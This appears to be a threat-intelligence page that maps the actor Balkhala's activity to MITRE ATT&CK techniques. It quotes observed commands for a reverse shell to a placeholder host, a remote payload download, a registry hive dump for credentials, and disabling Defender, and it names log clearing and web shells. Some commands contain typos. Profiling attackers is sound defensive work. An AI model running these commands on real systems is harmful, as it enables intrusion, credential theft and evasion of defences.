---
cover: ../../.gitbook/assets/bear_Balkhala_cover.png
coverY: 0
---

# Mitre

* **Tactic: TA0001 - Initial Access**  
  * **Technique: T1190 - Exploit Public-Facing Application**  
    * **Reasons:**  
      * Balkhala predominantly achieves initial access through exploitation of web servers commonly found on network perimeters and DMZs. (2023-06-14)  
      * Balkhala is also known for exploiting Confluence servers through the CVE-2021-26084 vulnerability, Exchange servers through multiple vulnerabilities including CVE-2022-41040 and ProxyShell, and likely commodity vulnerabilities in various open-source platforms such as content management systems. (2023-06-14)  
  
* **Tactic: TA0003 - Persistence**  
  * **Technique: T1505.003 - Server Software Component: Web Shell**  
    * **Reasons:**  
      * Balkhala frequently persists on target networks through the deployment of commodity web shells used either for commanding or tunneling. (2023-06-14)  
      * Commonly utilized web shells include P0wnyshell, reGeorg, PAS, and even custom variants included in publicly available exploit kits. (2023-06-14)  
  * **Technique: T1053.005 - Scheduled Task**  
    * **Reasons:**  
      * Frequently, remote command execution may be facilitated through remotely scheduled tasks. (2023-06-14)
    * **Procedures:**  
      * ```cmd.exe /Q /c schtasks /create /ru SYSTEM /sc HOURLY /MO 11 /tnn splservice /tr "c:\Windows\spl32.exe -e c:\windows\system32\cmd.exe $IP $PORT 1> \\127.0.0.1\ADMIN$\__$REDACTED 2>&1```
  
* **Tactic: TA0006 - Credential Access**  
  * **Technique: T1003.001 - OS Credential Dumping: LSASS Memory**  
    * **Reasons:**  
      * Balkhala uses Sysinternals tools such as procdump to dump LSASS in suspected offline credential harvesting efforts. (2023-06-14)  
      * Balkhala frequently renames procdump64 to alternative names, such as dump64.exe. (2023-06-14)
  * **Technique: T1003.002 - OS Credential Dumping: Security Account Manager**  
    * **Reasons:**  
      * Balkhala extracts registry hives using native means via reg save. (2023-06-14)  
    * **Procedures:**  
      * ```cmd.exe /Q /c reg.exe save hklm\security c:\ProgramData\security.save 1> \\127.0.0.1\ADMIN$\__$REDACTED 2>&1``` (2023-06-14)  
  * **Technique: T1078 - Valid Accounts**  
    * **Reasons:**  
      * Balkhala conducts lateral movement with valid network credentials obtained from credential harvesting. (2023-06-14)  
  
* **Tactic: TA0008 - Lateral Movement**  
  * **Technique: T1021 - Remote Services**  
    * **Reasons:**  
      * Balkhala conducts lateral movement with valid network credentials obtained from credential harvesting. (2023-06-14)

* **Tactic: TA0007 - Discovery**  
  * **Technique: T1082 - System Information Discovery**  
    * **Reasons:**  
      * Balkhala uses 'systeminfo' to fingerprint a device after lateral movement. (2023-06-14)  
  
  * **Technique: T1120 - Peripheral Device Discovery**  
    * **Reasons:**  
      * Balkhala uses 'get-volume' to fingerprint a device after lateral movement. (2023-06-14)
    * **Procedures:**  
      * ```cmd.exe /Q /c powershell get-volume 1> \\127.0.0.1\ADMIN$\__$REDACTED 2>&1``` (2023-06-14)
  
  * **Technique: T1046 - Network Service Scanning**  
    * **Reasons:**  
      * Balkhala uses 'nslookup' to research specific devices (IP) and FQDNs internally. (2023-06-14)  
  
  * **Technique: T1018 - Remote System Discovery**  
    * **Reasons:**  
      * Balkhala uses 'Get-DnsServerResourceRecord' to conduct reconnaissance of an internal DNS namespace. (2023-06-14)  
  
  * **Technique: T1049 - System Network Connections Discovery**  
    * **Reasons:**  
      * Balkhala uses 'query session' to profile RDP connections. (2023-06-14)  
      * Balkhala uses 'route print' to enumerate routes available on the devices. (2023-06-14)  
  
* **Tactic: TA0002 - Execution**  
  * **Technique: T1059.001 - Command and Scripting Interpreter: PowerShell**
    * **Reasons:**  
      * Balkhala uses 'DownloadFile' via PowerShell to download payloads from external servers. (2023-06-14) 
    * **Procedures:**  
      * ```cmd.exe /Q /c powershell "$wc=New-Object System.Net.WebClient;$wc.DownloadFiile('$IPADDRESS/filename', 'C:\ProgramData\USOPublic\UpdatePublic\winservice.exe')" 1> \\127.0.0.1\ADMIN$\__$REDACTED 2>&1``` (2023-06-14) 

* **Tactic: TA0011 - Command and Control**  
  * **Technique: T1090.001 - Internal Proxy**  
    * **Reasons:**  
      * Balkhala periodically uses generic socket-based tunneling utilities to facilitate command and control (C2) to actor-controlled infrastructure. (2023-06-14)  
      * Payloads such as NetCat and Go Simple Tunnel (GOST) are commonly renamed to blend into the operating system but are used to shovel interactive command prompts over established sockets. (2023-06-14)

* **Tactic: TA0005 - Defense Evasion**  
  * **Technique: T1070.001 - Indicator Removal: Clear Windows Event Logs**  
    * **Reasons:**  
      * The activities are anticipated to be consistent with anti-forensics activities. (2023-06-14)  
      * Common file targets during extraction are sec.evtx and sys.evtx. (2023-06-14)  
      * Balkhala commonly deletes files used during operational phases seen in lateral movement. (2023-06-14)  
  * **Technique: T1562.001 - Impair Defenses: Disable or Modify Tools**  
    * **Reasons:**  
      * Balkhala malware implants are known to disable Microsoft Defender Antivirus through a variety of means. (2023-06-14)  
      * NirSoft AdvancedRun utility, which is used to disable Microsoft Defender Antivirus by stopping the WinDefend service. (2023-06-14)  
      * Disable Windows Defender.bat, which presumably disables Microsoft Defender Antivirus via the registry. (2023-06-14)
    * **Procedures:**  
      * ```reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaiorMonitoring" /t REG_DWORD /d "1" /f```